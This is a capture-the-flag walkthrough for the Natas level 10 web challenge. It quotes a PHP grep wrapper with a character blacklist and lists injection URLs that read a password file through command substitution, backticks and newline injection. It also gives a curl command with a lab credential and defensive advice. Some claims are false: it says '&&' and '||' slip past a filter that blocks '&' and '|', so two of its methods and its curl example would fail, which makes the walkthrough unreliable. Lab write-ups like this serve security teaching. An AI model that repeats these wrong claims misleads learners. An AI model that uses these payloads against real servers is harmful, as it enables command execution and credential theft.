10 Command Injection — Filter Bypass Hard

// Key Concepts

Command Injection Filter Bypass OS Command Execution Input Validation Blacklist Evasion

// Challenge Overview

This level is similar to Level 9 but with a filter that attempts to block certain characters. The application now checks for specific characters in the input and rejects the request if they are found. However, the filter is incomplete and can be bypassed.

// Initial Analysis

View the source code to see the filter:

<?php $key = ""; if(array_key_exists("needle", $_GET)) { $key = $_GET["needle"]; } if($key != "") { if(preg_match('/[;|&]/', $key)) { print "Input contains an illegal character!"; } else { passthru("grep -i " . $key . " dictionary.txt"); } } ?>

The filter uses preg_match() to check for ;, |, and & characters. However, there are other ways to inject commands.

💡 Blacklist filters are often incomplete. Attackers can use alternative characters like ||, &&, $( ), or ` ` to bypass the filter.

// Understanding Filter Bypass

The filter blocks specific characters, but:

  • It doesn't block || (logical OR)
  • It doesn't block && (logical AND)
  • It doesn't block $() (command substitution)
  • It doesn't block backticks ` `
  • It doesn't block %0a (newline injection)

// Solution Walkthrough

Method 1 — Using Logical AND (&&):

http://natas10.natas.labs.overthewire.org/?needle=hello && cat /etc/natas_webpass/natas11

Method 2 — Using Logical OR (||):

http://natas10.natas.labs.overthewire.org/?needle=hello || cat /etc/natas_webpass/natas11

Method 3 — Using Command Substitution ($()):

http://natas10.natas.labs.overthewire.org/?needle=$(cat /etc/natas_webpass/natas11)

Method 4 — Using Backticks (` `):

http://natas10.natas.labs.overthewire.org/?needle=`cat /etc/natas_webpass/natas11`

Method 5 — Using Newline Injection (%0a):

http://natas10.natas.labs.overthewire.org/?needle=hello%0acat /etc/natas_webpass/natas11

Using curl:

curl -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu \ "http://natas10.natas.labs.overthewire.org/?needle=hello && cat /etc/natas_webpass/natas11"

// Why It Works

The filter is a blacklist that only blocks three specific characters. It fails because:

  • Incomplete blacklist: Many other shell metacharacters are not blocked.
  • No input sanitization: The input is used directly in the command.
  • Multiple injection vectors: Attackers can choose from many alternatives.

// Defensive Measures

  • Use whitelist validation instead of blacklist filtering.
  • Allow only pre-approved characters (e.g., letters, numbers, spaces).
  • Use escapeshellarg() and escapeshellcmd().
  • Avoid shell commands entirely — use native PHP functions.
  • Implement proper input validation with a positive security model.

// Key Takeaways

🚫 Blacklists Are Incomplete

Blacklist filters always miss something. Attackers will find ways around them. Use whitelists instead.

🛡️ Positive Security Model

Allow only what is explicitly permitted. This is much more secure than trying to block everything dangerous.
